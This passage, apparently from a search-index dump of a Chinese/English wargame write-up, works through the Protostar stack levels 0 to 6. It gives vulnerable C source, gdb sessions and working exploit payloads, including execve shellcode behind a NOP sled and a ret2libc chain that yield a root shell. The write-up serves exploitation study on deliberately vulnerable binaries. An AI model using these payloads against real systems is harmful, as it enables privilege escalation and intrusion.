0x0d0a0d0a ) { // '\\n\\r\\n\\r' in little endian printf ( \"you have correctly modified the variable \\n \" ); } else { printf ( \"Try again, you got 0x%08x \\n \" , modified ); } } Exploit \u00b6 1 2 $ GREENIE = $( python -c \"print('a' * 64 + '\\n\\r' * 2)\" ) ./stack2 you have correctly modified the variable Stack 3 \u00b6 overwriting function pointers stored on the stack 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 #include <stdlib.h> #include <unistd.h> #include <stdio.h> #include <string.h> void win () { printf ( \"code flow successfully changed \\n \" ); } int main ( int argc , char ** argv ) { volatile int ( * fp )(); char buffer [ 64 ]; fp = 0 ; gets ( buffer ); if ( fp ) { printf ( \"calling function pointer, jumping to 0x%08x \\n \" , fp ); fp (); } } 1 2 3 4 ( gdb ) x win 0x8048424 <win>: 0x83e58955 ( gdb ) p win # print the value of expression $1 = { void ( void )} 0x8048424 <win> Exploit \u00b6 1 2 3 $ python -c \"print('a' * 64 + '\\x24\\x84\\x04\\x08')\" | ./stack3 calling function pointer, jumping to 0x08048424 code flow successfully changed Stack 4 \u00b6 overwriting saved EIP 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 #include <stdlib.h> #include <unistd.h> #include <stdio.h> #include <string.h> void win () { printf ( \"code flow successfully changed \\n \" ); } int main ( int argc , char ** argv ) { char buffer [ 64 ]; gets ( buffer ); } \u9996\u5148\u6d4b\u8bd5\u4e00\u4e0b\u8986\u76d6\u70b9\u7684\u4f4d\u7f6e 1 2 3 from __future__ import print_function for i in range ( ord ( 'A' ), ord ( 'Z' )): print ( chr ( i ) * 4 , end = '' ) 1 2 3 4 5 6 7 $ python /tmp/stack.py > /tmp/test $ gdb ./stack4 ( gdb ) r < /tmp/test Starting program: /opt/protostar/bin/stack4 < /tmp/test Program received signal SIGSEGV, Segmentation fault. 0x54545454 in ?? () # T \u83b7\u53d6\u51fd\u6570 win \u7684\u5730\u5740 1 2 $ objdump -t stack4 | grep win 080483f4 g F .text 00000014 win Exploit \u00b6 1 2 3 $ python -c \"print('a' * 19 * 4 + '\\xf4\\x83\\x04\\x08')\" | ./stack4 code flow successfully changed Segmentation fault \u53ef\u4ee5\u4f7f\u7528 struct \u7b80\u5316 1 2 3 >>> import struct >>> struct . pack ( 'I' , 0x080483f4 ) ' \\xf4\\x83\\x04\\x08 ' Stack 5 \u00b6 If debugging the shellcode, use \\xcc (int3) to stop the program executing and return to the debugger 1 2 3 4 5 6 7 8 9 10 11 #include <stdlib.h> #include <unistd.h> #include <stdio.h> #include <string.h> int main ( int argc , char ** argv ) { char buffer [ 64 ]; gets ( buffer ); } \u9996\u5148\u9700\u8981\u786e\u5b9a\u53ef\u4ee5\u63a7\u5236 EIP \u7684\u6ea2\u51fa\u70b9 1 2 3 from __future__ import print_function for i in range ( ord ( 'A' ), ord ( 'Z' ) + 1 ): print ( chr ( i ) * 4 , end = '' ) 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 $ python /tmp/stack.py > /tmp/test $ gdb ./stack5 ( gdb ) disassemble main Dump of assembler code for function main: 0x080483c4 <main+0>: push %ebp 0x080483c5 <main+1>: mov %esp,%ebp 0x080483c7 <main+3>: and $0 xfffffff0,%esp 0x080483ca <main+6>: sub $0 x50,%esp 0x080483cd <main+9>: lea 0x10 ( %esp ) ,%eax 0x080483d1 <main+13>: mov %eax, ( %esp ) 0x080483d4 <main+16>: call 0x80482e8 <gets@plt> 0x080483d9 <main+21>: leave 0x080483da <main+22>: ret End of assembler dump. ( gdb ) break *0x080483da # ret ( gdb ) define hook-stop Type commands for definition of \"hook-stop\" . End with a line saying just \"end\" . >x/1i $eip >x/8wx $esp >end 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 ( gdb ) r < /tmp/test Starting program: /opt/protostar/bin/stack5 < /tmp/test 0x80483da <main+22>: ret 0xbffff6ac: 0x54545454 0x55555555 0x56565656 0x57575757 0xbffff6bc: 0x58585858 0x59595959 0x5a5a5a5a 0xb7ffef00 Breakpoint 1 , 0x080483da in main ( argc = Cannot access memory at address 0x5353535b ) at stack5/stack5.c:11 11 stack5/stack5.c: No such file or directory. in stack5/stack5.c ( gdb ) si Cannot access memory at address 0x53535357 ( gdb ) si Program received signal SIGSEGV, Segmentation fault. 0x54545454: Error while running hook_stop: Cannot access memory at address 0x54545454 0x54545454 in ?? () # T \u81f3\u4e8e\u8df3\u8f6c\u7684\u4f4d\u7f6e =v= \u53ef\u4ee5\u7b80\u5355\u5730\u9009\u62e9\u4e3a\u80fd\u591f\u63a7\u5236 EIP \u6ea2\u51fa\u70b9\u7684\u4e0b\u4e00\u4e2a\u5730\u5740\uff0c\u5373\u4ee5\u4e0b\u7684 0xbffff6b0 \uff08 0x55555555 \u5bf9\u5e94\u7684\u4f4d\u7f6e\uff09 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 Starting program: /opt/protostar/bin/stack5 < /tmp/test 0x80483da <main+22>: ret 0xbffff6ac: 0x54545454 0x55555555 0x56565656 0x57575757 0xbffff6bc: 0x58585858 0x59595959 0x5a5a5a5a 0xb7ffef00 Breakpoint 1 , 0x080483da in main ( argc = Cannot access memory at address 0x5353535b ) at stack5/stack5.c:11 11 in stack5/stack5.c ( gdb ) si Cannot access memory at address 0x53535357 ( gdb ) info registers eax 0xbffff660 -1073744288 ecx 0xbffff660 -1073744288 edx 0xb7fd9334 -1208118476 ebx 0xb7fd7ff4 -1208123404 esp 0xbffff6b0 0xbffff6b0 ebp 0x53535353 0x53535353 esi 0x0 0 edi 0x0 0 eip 0x54545454 0x54545454 eflags 0x200246 [ PF ZF IF ID ] cs 0x73 115 ss 0x7b 123 ds 0x7b 123 es 0x7b 123 fs 0x0 0 gs 0x33 51 \u4f46\u7531\u4e8e\u73af\u5883\u53d8\u91cf\u7684\u5b58\u5728\uff0c\u80fd\u591f\u63a7\u5236 EIP \u6ea2\u51fa\u70b9\u5bf9\u5e94\u7684\u5730\u5740\u5e76\u4e0d\u662f\u56fa\u5b9a\u7684\uff0c\u90a3\u4e48\u4e5f\u6ca1\u6cd5\u786e\u5b9a\u8981\u8df3\u8f6c\u7684\u4e0b\u4e00\u5730\u5740\u3002\u53ef\u4ee5\u7b80\u5355\u5730\u901a\u8fc7\u586b\u5145 NOP(No Operation) \u6307\u4ee4\u6765\u89e3\u51b3\u73af\u5883\u53d8\u91cf\u5bfc\u81f4\u7684\u5730\u5740\u4e0d\u4e00\u81f4\u95ee\u9898 \u5148\u8bd5\u8bd5\u4e0b\u4e2a\u65ad\u70b9~ 1 2 3 4 import struct eip = struct . pack ( 'I' , 0xbffff6b0 + 16 ) # \u4fdd\u8bc1\u8df3\u8f6c\u5728 NOP \u91cc > < nop = ' \\x90 ' * 64 print ( 'a' * 19 * 4 + eip + nop + ' \\xcc ' * 4 ) 1 2 3 $ python /tmp/stack.py > /tmp/break $ ./stack5 < /tmp/break Trace/breakpoint trap \u63a5\u4e0b\u6765\u5c06 INT3 \u6307\u4ee4\u66ff\u6362\u4e3a shellcode 1 2 3 4 5 6 import struct eip = struct . pack ( 'I' , 0xbffff6b0 + 16 ) nop = ' \\x90 ' * 64 shellcode = ' \\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x89\\xc1\\x89\\xc2\\xb0\\x0b\\xcd\\x80\\x31\\xc0\\x40\\xcd\\x80 ' print ( 'a' * 19 * 4 + eip + nop + shellcode ) # http://shell-storm.org/shellcode/files/shellcode-811.php 1 2 3 4 5 6 7 8 $ python /tmp/stack.py | ./stack5 # nothing happened (\u014f\u03c9\u014f) $ python /tmp/stack.py > /tmp/getshell $ gdb ./stack5 ( gdb ) r < /tmp/getshell Starting program: /opt/protostar/bin/stack5 < /tmp/getshell Executing new program: /bin/dash # \u901a\u8fc7 gdb \u53ef\u4ee5\u770b\u5230 shell \u80fd\u591f\u83b7\u53d6 Program exited normally. \u53ef\u4ee5\u901a\u8fc7 cat \u6765\u4fdd\u8bc1\u83b7\u5f97 shell \u540e\u4e0d\u76f4\u63a5\u9000\u51fa 1 2 3 4 5 $ ( python /tmp/stack.py ; cat ) | ./stack5 id uid = 1001 ( user ) gid = 1001 ( user ) euid = 0 ( root ) groups = 0 ( root ) ,1001 ( user ) whoami root Stack 6 \u00b6 what happens when you have restrictions on the return address 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 #include <stdlib.h> #include <unistd.h> #include <stdio.h> #include <string.h> void getpath () { char buffer [ 64 ]; unsigned int ret ; printf ( \"input path please: \" ); fflush ( stdout ); gets ( buffer ); ret = __builtin_return_address ( 0 ); // read the current return address from the stack if (( ret & 0xbf000000 ) == 0xbf000000 ) { // check the return address if it starts with 0xbf printf ( \"bzzzt (%p) \\n \" , ret ); _exit ( 1 ); } printf ( \"got path %s \\n \" , buffer ); } int main ( int argc , char ** argv ) { getpath (); } \u9996\u5148\u6d4b\u8bd5\u80fd\u591f\u63a7\u5236 EIP \u7684\u6ea2\u51fa\u70b9\uff08\u4e0e\u5148\u524d\u7684\u65b9\u6cd5\u76f8\u540c\uff0c\u4f4d\u7f6e\u5bf9\u5e94 U \uff09 \u901a\u8fc7 gdb \u53ef\u4ee5\u770b\u5230 0xbf \u5f00\u5934\u7684\u5730\u5740\u5bf9\u5e94 stack 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 $ gdb ./stack6 ( gdb ) break *getpath Breakpoint 1 at 0x8048484: file stack6/stack6.c, line 7 . ( gdb ) r Starting program: /opt/protostar/bin/stack6 Breakpoint 1 , getpath () at stack6/stack6.c:7 7 stack6/stack6.c: No such file or directory. in stack6/stack6.c ( gdb ) info proc map process 2921 cmdline = '/opt/protostar/bin/stack6' cwd = '/opt/protostar/bin' exe = '/opt/protostar/bin/stack6' Mapped address spaces: Start Addr End Addr Size Offset objfile 0x8048000 0x8049000 0x1000 0 /opt/protostar/bin/stack6 0x8049000 0x804a000 0x1000 0 /opt/protostar/bin/stack6 0xb7e96000 0xb7e97000 0x1000 0 0xb7e97000 0xb7fd5000 0x13e000 0 /lib/libc-2.11.2.so 0xb7fd5000 0xb7fd6000 0x1000 0x13e000 /lib/libc-2.11.2.so 0xb7fd6000 0xb7fd8000 0x2000 0x13e000 /lib/libc-2.11.2.so 0xb7fd8000 0xb7fd9000 0x1000 0x140000 /lib/libc-2.11.2.so 0xb7fd9000 0xb7fdc000 0x3000 0 0xb7fe0000 0xb7fe2000 0x2000 0 0xb7fe2000 0xb7fe3000 0x1000 0 [ vdso ] 0xb7fe3000 0xb7ffe000 0x1b000 0 /lib/ld-2.11.2.so 0xb7ffe000 0xb7fff000 0x1000 0x1a000 /lib/ld-2.11.2.so 0xb7fff000 0xb8000000 0x1000 0x1b000 /lib/ld-2.11.2.so 0xbffeb000 0xc0000000 0x15000 0 [ stack ] ret \u6307\u4ee4\u5f39\u51fa\u6808\u9876\u5b58\u50a8\u7684\u5730\u5740\u5e76\u8df3\u8f6c\uff0c\u90a3\u4e48\u53ef\u4ee5\u5148\u8df3\u8f6c\u5230 ret \u672c\u8eab\u7ed5\u8fc7\u68c0\u67e5\uff0c\u63a5\u4e0b\u6765\u518d\u8df3\u8f6c\u5230\u6808\u5c31\u53ef\u4ee5\u4e86 :3 Dump of assembler code for function getpath 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 ( gdb ) disassemble getpath Dump of assembler code for function getpath: 0x08048484 <getpath+0>: push ebp 0x08048485 <getpath+1>: mov ebp,esp 0x08048487 <getpath+3>: sub esp,0x68 0x0804848a <getpath+6>: mov eax,0x80485d0 0x0804848f <getpath+11>: mov DWORD PTR [ esp ] ,eax 0x08048492 <getpath+14>: call 0x80483c0 <printf@plt> 0x08048497 <getpath+19>: mov eax,ds:0x8049720 0x0804849c <getpath+24>: mov DWORD PTR [ esp ] ,eax 0x0804849f <getpath+27>: call 0x80483b0 <fflush@plt> 0x080484a4 <getpath+32>: lea eax, [ ebp-0x4c ] 0x080484a7 <getpath+35>: mov DWORD PTR [ esp ] ,eax 0x080484aa <getpath+38>: call 0x8048380 <gets@plt> 0x080484af <getpath+43>: mov eax,DWORD PTR [ ebp+0x4 ] 0x080484b2 <getpath+46>: mov DWORD PTR [ ebp-0xc ] ,eax 0x080484b5 <getpath+49>: mov eax,DWORD PTR [ ebp-0xc ] 0x080484b8 <getpath+52>: and eax,0xbf000000 0x080484bd <getpath+57>: cmp eax,0xbf000000 0x080484c2 <getpath+62>: jne 0x80484e4 <getpath+96> 0x080484c4 <getpath+64>: mov eax,0x80485e4 0x080484c9 <getpath+69>: mov edx,DWORD PTR [ ebp-0xc ] 0x080484cc <getpath+72>: mov DWORD PTR [ esp+0x4 ] ,edx 0x080484d0 <getpath+76>: mov DWORD PTR [ esp ] ,eax 0x080484d3 <getpath+79>: call 0x80483c0 <printf@plt> 0x080484d8 <getpath+84>: mov DWORD PTR [ esp ] ,0x1 0x080484df <getpath+91>: call 0x80483a0 <_exit@plt> 0x080484e4 <getpath+96>: mov eax,0x80485f0 0x080484e9 <getpath+101>: lea edx, [ ebp-0x4c ] 0x080484ec <getpath+104>: mov DWORD PTR [ esp+0x4 ] ,edx 0x080484f0 <getpath+108>: mov DWORD PTR [ esp ] ,eax 0x080484f3 <getpath+111>: call 0x80483c0 <printf@plt> 0x080484f8 <getpath+116>: leave 0x080484f9 <getpath+117>: ret End of assembler dump. 1 2 3 4 5 import struct ret = struct . pack ( 'I' , 0x080484f9 ) eip = struct . pack ( 'I' , 0xbffff6b0 + 16 ) nop = ' \\x90 ' * 64 print ( 'a' * 80 + ret + eip + nop + ' \\xcc ' * 4 ) # just to hit the break point 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 $ python /tmp/stack.py > /tmp/break $ gdb ./stack6 ( gdb ) break *0x080484f9 Breakpoint 1 at 0x80484f9: file stack6/stack6.c, line 23 . ( gdb ) define hook-stop Type commands for definition of \"hook-stop\" . End with a line saying just \"end\" . >x/1i $eip >x/8wx $esp >end ( gdb ) r < /tmp/break Starting program: /opt/protostar/bin/stack6 < /tmp/break input path please: got path aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\ufffdaaaaaaaaaaaa\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd 0x80484f9 <getpath+117>: ret 0xbffff69c: 0x080484f9 0xbffff6c0 0x90909090 0x90909090 0xbffff6ac: 0x90909090 0x90909090 0x90909090 0x90909090 Breakpoint 1 , 0x080484f9 in getpath () at stack6/stack6.c:23 23 stack6/stack6.c: No such file or directory. in stack6/stack6.c ( gdb ) si 0x80484f9 <getpath+117>: ret # ret again, because we jump to it 0xbffff6a0: 0xbffff6c0 0x90909090 0x90909090 0x90909090 0xbffff6b0: 0x90909090 0x90909090 0x90909090 0x90909090 Breakpoint 1 , 0x080484f9 in getpath () at stack6/stack6.c:23 23 in stack6/stack6.c ( gdb ) Cannot access memory at address 0x61616165 ( gdb ) 0xbffff6c1: nop 0xbffff6a4: 0x90909090 0x90909090 0x90909090 0x90909090 0xbffff6b4: 0x90909090 0x90909090 0x90909090 0x90909090 0xbffff6c1 in ?? () ( gdb ) c Continuing. Program received signal SIGTRAP, Trace/breakpoint trap. 0xbffff6e5: int3 0xbffff6a4: 0x90909090 0x90909090 0x90909090 0x90909090 0xbffff6b4: 0x90909090 0x90909090 0x90909090 0x90909090 0xbffff6e5 in ?? () This level can be done in a couple of ways, such as finding the duplicate of the payload ( objdump -s will help with this), or ret2libc , or even return orientated programming. system \u662f libc \u51fd\u6570\uff0c\u80fd\u591f\u6267\u884c shell \u547d\u4ee4 1 2 3 4 5 #include <stdlib.h> void main () { system ( \"/bin/sh\" ); } 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 $ gcc sys.c -o sys $ ./sys $ id uid = 1001 ( user ) gid = 1001 ( user ) groups = 1001 ( user ) $ exit $ gdb ./sys ( gdb ) set disassembly-flavor intel ( gdb ) disassemble main Dump of assembler code for function main: 0x080483c4 <main+0>: push ebp 0x080483c5 <main+1>: mov ebp,esp 0x080483c7 <main+3>: and esp,0xfffffff0 0x080483ca <main+6>: sub esp,0x10 0x080483cd <main+9>: mov DWORD PTR [ esp ] ,0x80484a0 # \u9700\u6267\u884c\u7684\u547d\u4ee4\u5165\u6808 0x080483d4 <main+16>: call 0x80482ec <system@plt> # \u8c03\u7528\u51fd\u6570\u4f1a\u5c06 call \u7684\u4e0b\u4e00\u6761\u6307\u4ee4\u5730\u5740\u5165\u6808 0x080483d9 <main+21>: leave 0x080483da <main+22>: ret End of assembler dump. ( gdb ) x/s 0x80484a0 0x80484a0: \"/bin/sh\" call system \u4e4b\u540e\uff0c\u6808\u5e94\u4e3a\u4ee5\u4e0b\u7ed3\u6784 ... ... call \u4e0b\u4e00\u6761\u6307\u4ee4\u7684\u5730\u5740 0x80484a0\uff08\u53c2\u6570\u5b57\u7b26\u4e32\u6240\u5728\u7684\u5730\u5740\uff09 \u63a7\u5236 getpath \u7684 ret \u8fd4\u56de\u5230 system \uff0c\u56e0\u4e3a\u6ca1\u6709\u4f7f\u7528 call \u6240\u4ee5\u9700\u8981\u6784\u9020\u7c7b\u4f3c call \u4ea7\u751f\u7684\u6808 \u53ef\u4ee5\u501f\u52a9 libc \u4f20\u9012\u6240\u9700\u7684\u547d\u4ee4\u5b57\u7b26\u4e32 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 # \u83b7\u53d6 /bin/sh \u5728 libc \u4e2d\u7684 offset # -t x: Print the location of the string in hex $ strings -a -t x /lib/libc-2.11.2.so | grep \"/bin/sh\" 11f3bf /bin/sh $ gdb ./stack6 ... ( gdb ) p system # system \u7684\u5730\u5740 $1 = { <text variable, no debug info> } 0xb7ecffb0 <__libc_system> ( gdb ) info proc map process 3986 cmdline = '/opt/protostar/bin/stack6' cwd = '/opt/protostar/bin' exe = '/opt/protostar/bin/stack6' Mapped address spaces: Start Addr End Addr Size Offset objfile 0x8048000 0x8049000 0x1000 0 /opt/protostar/bin/stack6 0x8049000 0x804a000 0x1000 0 /opt/protostar/bin/stack6 0xb7e96000 0xb7e97000 0x1000 0 0xb7e97000 0xb7fd5000 0x13e000 0 /lib/libc-2.11.2.so 0xb7fd5000 0xb7fd6000 0x1000 0x13e000 /lib/libc-2.11.2.so 0xb7fd6000 0xb7fd8000 0x2000 0x13e000 /lib/libc-2.11.2.so 0xb7fd8000 0xb7fd9000 0x1000 0x140000 /lib/libc-2.11.2.so 0xb7fd9000 0xb7fdc000 0x3000 0 0xb7fe0000 0xb7fe2000 0x2000 0 0xb7fe2000 0xb7fe3000 0x1000 0 [ vdso ] 0xb7fe3000 0xb7ffe000 0x1b000 0 /lib/ld-2.11.2.so 0xb7ffe000 0xb7fff000 0x1000 0x1a000 /lib/ld-2.11.2.so 0xb7fff000 0xb8000000 0x1000 0x1b000 /lib/ld-2.11.2.so 0xbffeb000 0xc0000000 0x15000 0 [ stack ] ( gdb ) x/s 0xb7e97000+0x11f3bf # offset \u7ed3\u5408 libc \u7684\u8d77\u59cb\u5730\u5740\u53ef\u83b7\u5f97 /bin/sh \u7684\u5730\u5740 0xb7fb63bf: \"/bin/sh\" Exploit \u00b6 1 2 3 4 5 import struct system = struct . pack ( \"I\" , 0xb7ecffb0 ) ret_after_sys = 'AAAA' bin_sh = struct . pack ( \"I\" , 0xb7fb63bf ) print ( 'a' * 80 + system + ret_after_sys + bin_sh ) # ret2libc 1 2 3 4 5 6 $ ( python /tmp/stack.py ; cat ) | ./stack6 input path please: got path aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\ufffd\ufffd\ufffdaaaaaaaaaaaa\ufffd\ufffd\ufffdAAAA\ufffdc\ufffd\ufffd id uid = 1001 ( user ) gid = 1001 ( user ) euid = 0 ( root ) groups = 0 ( root ) ,1001 ( user ) whoami root","title":"Stack"},{"location":"wargames/protostar/stack/#stack-0","text":"memory can be accessed outside of its allocated region 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 #include <stdlib.h> #include <unistd.h> #include <stdio.h> int main ( int argc , char ** argv ) { volatile int modified ; // volatile tells the compiler not to cache the value of `modified` char buffer [ 64 ]; modified = 0 ; gets ( buffer ); // Never use gets(). // Because it's impossible to tell without knowing the data in advance // how many characters gets() will read, and gets() will continue to // store characters past the end of the buffer if ( modified != 0 ) { printf ( \"you have changed the 'modified' variable \\n \" ); } else { printf ( \"Try again? \\n \" ); } } Dump of assembler code for function main 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 ( gdb ) set disassembly-flavor intel ( gdb ) disassemble main Dump of assembler code for function main: 0x080483f4 <main+0>: push ebp 0x080483f5 <main+1>: mov ebp,esp 0x080483f7 <main+3>: and esp,0xfffffff0 0x080483fa <main+6>: sub esp,0x60 0x080483fd <main+9>: mov DWORD PTR [ esp+0x5c ] ,0x0 # modified = 0 0x08048405 <main+17>: lea eax, [ esp+0x1c ] 0x08048409 <main+21>: mov DWORD PTR [ esp ] ,eax # passing the address of buffer to gets() 0x0804840c <main+24>: call 0x804830c <gets@plt> 0x08048411 <main+29>: mov eax,DWORD PTR [ esp+0x5c ] # starting to check the value of modified 0x08048415 <main+33>: test eax,eax 0x08048417 <main+35>: je 0x8048427 <main+51> 0x08048419 <main+37>: mov DWORD PTR [ esp ] ,0x8048500 0x08048420 <main+44>: call 0x804832c <puts@plt> 0x08048425 <main+49>: jmp 0x8048433 <main+63> 0x08048427 <main+51>: mov DWORD PTR [ esp ] ,0x8048529 0x0804842e <main+58>: call 0x804832c <puts@plt> 0x08048433 <main+63>: leave 0x08048434 <main+64>: ret End of assembler dump. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 ( gdb ) break *0x0804840c Breakpoint 2 at 0x804840c: file stack0/stack0.c, line 11 . ( gdb ) break *0x08048411 Breakpoint 3 at 0x8048411: file stack0/stack0.c, line 13 . ( gdb ) define hook-stop # define a hook, some commands will be executed when stops # Note: some unimportant output parts are omitted below Type commands for definition of \"hook-stop\" . End with a line saying just \"end\" . >info registers >x/24wx $esp >x/2i $eip >end ( gdb ) r Starting program: /opt/protostar/bin/stack0 ( gdb ) c Continuing. THISISTHEINPUT # 544849534953544845494e505554 eax 0xbffff65c -1073744292 ecx 0xbffff65c -1073744292 edx 0xb7fd9334 -1208118476 ebx 0xb7fd7ff4 -1208123404 esp 0xbffff640 0xbffff640 ebp 0xbffff6a8 0xbffff6a8 esi 0x0 0 edi 0x0 0 eip 0x8048411 0x8048411 <main+29> eflags 0x200246 [ PF ZF IF ID ] cs 0x73 115 ss 0x7b 123 ds 0x7b 123 es 0x7b 123 fs 0x0 0 gs 0x33 51 0xbffff640: 0xbffff65c 0x00000001 0xb7fff8f8 0xb7f0186e 0xbffff650: 0xb7fd7ff4 0xb7ec6165 0xbffff668 0x53494854 # start from here 0xbffff660: 0x48545349 0x504e4945 0xbf005455 0x080482e8 0xbffff670: 0xb7ff1040 0x08049620 0xbffff6a8 0x08048469 0xbffff680: 0xb7fd8304 0xb7fd7ff4 0x08048450 0xbffff6a8 0xbffff690: 0xb7ec6365 0xb7ff1040 0x0804845b 0x00000000 # need at least 16 bytes + 1 bit to overwrite the value of `modified` 0x8048411 <main+29>: mov eax,DWORD PTR [ esp+0x5c ] 0x8048415 <main+33>: test eax,eax Breakpoint 3 , main ( argc = 1 , argv = 0xbffff754 ) at stack0/stack0.c:13 13 in stack0/stack0.c ( gdb ) x/wx $esp +0x5c # check the value of `modified` 0xbffff69c: 0x00000000 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 ( gdb ) r The program being debugged has been started already. Start it from the beginning? ( y or n ) y Starting program: /opt/protostar/bin/stack0 ( gdb ) c Continuing. 123456789012345678901234567890123456789012345678901234567890ABCDE eax 0xbffff65c -1073744292 ecx 0xbffff65c -1073744292 edx 0xb7fd9334 -1208118476 ebx 0xb7fd7ff4 -1208123404 esp 0xbffff640 0xbffff640 ebp 0xbffff6a8 0xbffff6a8 esi 0x0 0 edi 0x0 0 eip 0x8048411 0x8048411 <main+29> eflags 0x200246 [ PF ZF IF ID ] cs 0x73 115 ss 0x7b 123 ds 0x7b 123 es 0x7b 123 fs 0x0 0 gs 0x33 51 0xbffff640: 0xbffff65c 0x00000001 0xb7fff8f8 0xb7f0186e 0xbffff650: 0xb7fd7ff4 0xb7ec6165 0xbffff668 0x34333231 0xbffff660: 0x38373635 0x32313039 0x36353433 0x30393837 0xbffff670: 0x34333231 0x38373635 0x32313039 0x36353433 0xbffff680: 0x30393837 0x34333231 0x38373635 0x32313039 0xbffff690: 0x36353433 0x30393837 0x44434241 0x00000045 0x8048411 <main+29>: mov eax,DWORD PTR [ esp+0x5c ] 0x8048415 <main+33>: test eax,eax Breakpoint 3 , main ( argc = 1 , argv = 0xbffff754 ) at stack0/stack0.c:13 13 in stack0/stack0.c ( gdb ) x/wx $esp +0x5c 0xbffff69c: 0x00000045 ( gdb ) c Continuing. you have changed the 'modified' variable","title":"Stack 0"},{"location":"wargames/protostar/stack/#exploit","text":"1 2 $ python -c 'print(\"A\" * 65)' | ./stack0 you have changed the 'modified' variable","title":"Exploit"},{"location":"wargames/protostar/stack/#stack-1","text":"Protostar is little endian 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 #include <stdlib.h> #include <unistd.h> #include <stdio.h> #include <string.h> int main ( int argc , char ** argv ) { volatile int modified ; char buffer [ 64 ]; if ( argc == 1 ) { errx ( 1 , \"please specify an argument \\n \" ); } modified = 0 ; strcpy ( buffer , argv [ 1 ]); if ( modified == 0x61626364 ) { // 'dcba' in little endian printf ( \"you have correctly got the variable to the right value \\n \" ); } else { printf ( \"Try again, you got 0x%08x \\n \" , modified ); } }","title":"Stack 1"},{"location":"wargames/protostar/stack/#exploit_1","text":"1 2 $ ./stack1 $( python -c 'print(\"A\" * 64 + \"dcba\")' ) you have correctly got the variable to the right value","title":"Exploit"},{"location":"wargames/protostar/stack/#stack-2","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 #include <stdlib.h> #include <unistd.h> #include <stdio.h> #include <string.h> int main ( int argc , char ** argv ) { volatile int modified ; char buffer [ 64 ]; char * variable ; variable = getenv ( \"GREENIE\" ); if ( variable == NULL ) { errx ( 1 , \"please set the GREENIE environment variable \\n \" ); } modified = 0 ; strcpy ( buffer , variable ); if ( modified == 0x0d0a0d0a ) { // '\\n\\r\\n\\r' in little endian printf ( \"you have correctly modified the variable \\n \" ); } else { printf ( \"Try again, you got 0x%08x \\n \" , modified ); } }","title":"Stack 2"},{"location":"wargames/protostar/stack/#exploit_2","text":"1 2 $ GREENIE = $( python -c \"print('a' * 64 + '\\n\\r' * 2)\" ) ./stack2 you have correctly modified the variable","title":"Exploit"},{"location":"wargames/protostar/stack/#stack-3","text":"overwriting function pointers stored on the stack 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 #include <stdlib.h> #include <unistd.h> #include <stdio.h> #include <string.h> void win () { printf ( \"code flow successfully changed \\n \" ); } int main ( int argc , char ** argv ) { volatile int ( * fp )(); char buffer [ 64 ]; fp = 0 ; gets ( buffer ); if ( fp ) { printf ( \"calling function pointer, jumping to 0x%08x \\n \" , fp ); fp (); } } 1 2 3 4 ( gdb ) x win 0x8048424 <win>: 0x83e58955 ( gdb ) p win # print the value of expression $1 = { void ( void )} 0x8048424 <win>","title":"Stack 3"},{"location":"wargames/protostar/stack/#exploit_3","text":"1 2 3 $ python -c \"print('a' * 64 + '\\x24\\x84\\x04\\x08')\" | ./stack3 calling function pointer, jumping to 0x08048424 code flow successfully changed","title":"Exploit"},{"location":"wargames/protostar/stack/#stack-4","text":"overwriting saved EIP 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 #include <stdlib.h> #include <unistd.h> #include <stdio.h> #include <string.h> void win () { printf ( \"code flow successfully changed \\n \" ); } int main ( int argc , char ** argv ) { char buffer [ 64 ]; gets ( buffer ); } \u9996\u5148\u6d4b\u8bd5\u4e00\u4e0b\u8986\u76d6\u70b9\u7684\u4f4d\u7f6e 1 2 3 from __future__ import print_function for i in range ( ord ( 'A' ), ord ( 